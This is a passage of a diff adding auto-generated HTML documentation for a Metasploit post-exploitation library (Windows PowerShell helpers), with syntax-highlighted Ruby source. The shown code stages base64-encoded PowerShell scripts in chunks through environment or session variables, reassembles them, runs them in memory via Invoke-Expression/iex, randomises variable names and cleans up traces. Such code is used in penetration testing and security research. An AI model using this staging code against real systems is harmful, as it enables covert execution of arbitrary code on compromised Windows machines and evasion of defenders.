+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_compressed_script'>compressed_script</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>\s|\.|\;</span><span class='regexp_end'>/</span></span>
+    <span class='id identifier rubyid_compressed_script'>compressed_script</span> <span class='op'>=</span> <span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_compressed_script'>compressed_script</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Divide the encoded script into 8000 byte chunks and iterate
+</span>  <span class='id identifier rubyid_index'>index</span> <span class='op'>=</span> <span class='int'>0</span>
+  <span class='id identifier rubyid_count'>count</span> <span class='op'>=</span> <span class='int'>8000</span>
+  <span class='kw'>while</span> <span class='id identifier rubyid_index'>index</span> <span class='op'>&lt;</span> <span class='id identifier rubyid_compressed_script'>compressed_script</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span> <span class='op'>-</span> <span class='int'>1</span>
+    <span class='comment'># Define random, but serialized variable name
+</span>    <span class='id identifier rubyid_env_variable'>env_variable</span> <span class='op'>=</span> <span class='id identifier rubyid_format'>format</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>%05d%s</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='lparen'>(</span><span class='lparen'>(</span><span class='id identifier rubyid_index'>index</span> <span class='op'>+</span> <span class='int'>8000</span><span class='rparen'>)</span> <span class='op'>/</span> <span class='int'>8000</span><span class='rparen'>)</span><span class='comma'>,</span> <span class='id identifier rubyid_env_suffix'>env_suffix</span><span class='rparen'>)</span>
+
+    <span class='comment'># Create chunk
+</span>    <span class='id identifier rubyid_chunk'>chunk</span> <span class='op'>=</span> <span class='id identifier rubyid_compressed_script'>compressed_script</span><span class='lbracket'>[</span><span class='id identifier rubyid_index'>index</span><span class='comma'>,</span> <span class='id identifier rubyid_count'>count</span><span class='rbracket'>]</span>
+
+    <span class='comment'># Build the set commands
+</span>    <span class='id identifier rubyid_set_env_variable'>set_env_variable</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[Environment]::SetEnvironmentVariable(</span><span class='tstring_end'>&quot;</span></span> \
+                        <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_env_variable'>env_variable</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;,</span><span class='tstring_end'>&quot;</span></span> \
+                        <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_chunk'>chunk</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;, &#39;User&#39;)</span><span class='tstring_end'>&quot;</span></span>
+
+    <span class='comment'># Compress and encode the set command
+</span>    <span class='id identifier rubyid_encoded_stager'>encoded_stager</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_set_env_variable'>set_env_variable</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+    <span class='comment'># Stage the payload
+</span>    <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'> - Bytes remaining: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_compressed_script'>compressed_script</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span> <span class='op'>-</span> <span class='id identifier rubyid_index'>index</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_execute_script'>execute_script</span><span class='lparen'>(</span><span class='id identifier rubyid_encoded_stager'>encoded_stager</span><span class='comma'>,</span> <span class='kw'>false</span><span class='rparen'>)</span>
+
+    <span class='id identifier rubyid_index'>index</span> <span class='op'>+=</span> <span class='id identifier rubyid_count'>count</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Build the script reassembler
+</span>  <span class='id identifier rubyid_reassemble_command'>reassemble_command</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[Environment]::GetEnvironmentVariables(&#39;User&#39;).keys|</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_reassemble_command'>reassemble_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Select-String </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_env_suffix'>env_suffix</span><span class='embexpr_end'>}</span><span class='tstring_content'>|Sort-Object|%{</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_reassemble_command'>reassemble_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$c+=[Environment]::GetEnvironmentVariable($_,&#39;User&#39;)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_reassemble_command'>reassemble_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>};Invoke-Expression $($([Text.Encoding]::Unicode.</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_reassemble_command'>reassemble_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GetString($([Convert]::FromBase64String($c)))))</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='comment'># Compress and encode the reassemble command
+</span>  <span class='id identifier rubyid_encoded_script'>encoded_script</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_reassemble_command'>reassemble_command</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_encoded_script'>encoded_script</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="stage_psh_env-instance_method">
+  
+    #<strong>stage_psh_env</strong>(script)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Uploads a script into a Powershell session via memory (Powershell session types only). If the script is larger than 15000 bytes the script will be uploaded in a staged approach</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 164</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_stage_psh_env'>stage_psh_env</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='rparen'>)</span>
+  <span class='kw'>begin</span>
+    <span class='id identifier rubyid_ps_script'>ps_script</span> <span class='op'>=</span> <span class='id identifier rubyid_read_script'>read_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_encoded_expression'>encoded_expression</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_ps_script'>ps_script</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_cleanup_commands'>cleanup_commands</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+    <span class='comment'># Add entropy to script variable names
+</span>    <span class='id identifier rubyid_script_var'>script_var</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_decscript'>decscript</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_scriptby'>scriptby</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_scriptbybase'>scriptbybase</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_scriptbybasefull'>scriptbybasefull</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span>
+
+    <span class='kw'>if</span> <span class='id identifier rubyid_encoded_expression'>encoded_expression</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span> <span class='op'>&gt;</span> <span class='int'>14999</span>
+      <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Script size: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_expression'>encoded_expression</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='embexpr_end'>}</span><span class='tstring_content'> This script requires a stager</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_arr'>arr</span> <span class='op'>=</span> <span class='id identifier rubyid_encoded_expression'>encoded_expression</span><span class='period'>.</span><span class='id identifier rubyid_chars'>chars</span><span class='period'>.</span><span class='id identifier rubyid_each_slice'>each_slice</span><span class='lparen'>(</span><span class='int'>14999</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span><span class='lparen'>(</span><span class='op'>&amp;</span><span class='symbol'>:join</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Loading </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_arr'>arr</span><span class='period'>.</span><span class='id identifier rubyid_count'>count</span><span class='embexpr_end'>}</span><span class='tstring_content'> chunks into the stager.</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_vararray'>vararray</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+      <span class='id identifier rubyid_arr'>arr</span><span class='period'>.</span><span class='id identifier rubyid_each_with_index'>each_with_index</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_slice'>slice</span><span class='comma'>,</span> <span class='id identifier rubyid_index'>index</span><span class='op'>|</span>
+        <span class='id identifier rubyid_variable'>variable</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_script'>ps_script</span><span class='period'>.</span><span class='id identifier rubyid_rig'>rig</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span>
+        <span class='id identifier rubyid_vararray'>vararray</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_variable'>variable</span>
+        <span class='id identifier rubyid_indexval'>indexval</span> <span class='op'>=</span> <span class='id identifier rubyid_index'>index</span> <span class='op'>+</span> <span class='int'>1</span>
+        <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Loaded stage:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_indexval'>indexval</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+        <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_variable'>variable</span><span class='embexpr_end'>}</span><span class='tstring_content'> = \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_slice'>slice</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+        <span class='id identifier rubyid_cleanup_commands'>cleanup_commands</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Remove-Variable </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_variable'>variable</span><span class='embexpr_end'>}</span><span class='tstring_content'> -EA 0</span><span class='tstring_end'>&quot;</span></span>
+      <span class='kw'>end</span>
+
+      <span class='id identifier rubyid_linkvars'>linkvars</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+      <span class='id identifier rubyid_vararray'>vararray</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_var'>var</span><span class='op'>|</span> <span class='id identifier rubyid_linkvars'>linkvars</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'> + $</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var'>var</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span> <span class='rbrace'>}</span>
+      <span class='id identifier rubyid_linkvars'>linkvars</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='op'>..</span><span class='int'>2</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script_var'>script_var</span><span class='embexpr_end'>}</span><span class='tstring_content'> = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_linkvars'>linkvars</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+    <span class='kw'>else</span>
+      <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Script size: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_expression'>encoded_expression</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script_var'>script_var</span><span class='embexpr_end'>}</span><span class='tstring_content'> = \&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_expression'>encoded_expression</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_decscript'>decscript</span><span class='embexpr_end'>}</span><span class='tstring_content'> = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script_var'>script_var</span><span class='embexpr_end'>}</span><span class='tstring_content'>))</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptby'>scriptby</span><span class='embexpr_end'>}</span><span class='tstring_content'>  = [System.Text.Encoding]::UTF8.GetBytes(\&quot;$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_decscript'>decscript</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&quot;)</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptbybase'>scriptbybase</span><span class='embexpr_end'>}</span><span class='tstring_content'> = [System.Convert]::ToBase64String($</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptby'>scriptby</span><span class='embexpr_end'>}</span><span class='tstring_content'>) </span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptbybasefull'>scriptbybasefull</span><span class='embexpr_end'>}</span><span class='tstring_content'> = ([System.Convert]::FromBase64String($</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptbybase'>scriptbybase</span><span class='embexpr_end'>}</span><span class='tstring_content'>))</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>([System.Text.Encoding]::UTF8.GetString($</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scriptbybasefull'>scriptbybasefull</span><span class='embexpr_end'>}</span><span class='tstring_content'>))|iex</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Module loaded</span><span class='tstring_end'>&quot;</span></span>
+
+    <span class='kw'>unless</span> <span class='id identifier rubyid_cleanup_commands'>cleanup_commands</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+      <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Cleaning up </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cleanup_commands'>cleanup_commands</span><span class='period'>.</span><span class='id identifier rubyid_count'>count</span><span class='embexpr_end'>}</span><span class='tstring_content'> stager variables</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_shell_command'>shell_command</span><span class='lparen'>(</span><span class='id identifier rubyid_cleanup_commands'>cleanup_commands</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+  <span class='kw'>rescue</span> <span class='const'>Errno</span><span class='op'>::</span><span class='const'>EISDIR</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_e'>e</span>
+    <span class='id identifier rubyid_vprint_error'>vprint_error</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to upload script: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='period'>.</span><span class='id identifier rubyid_message'>message</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:08 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
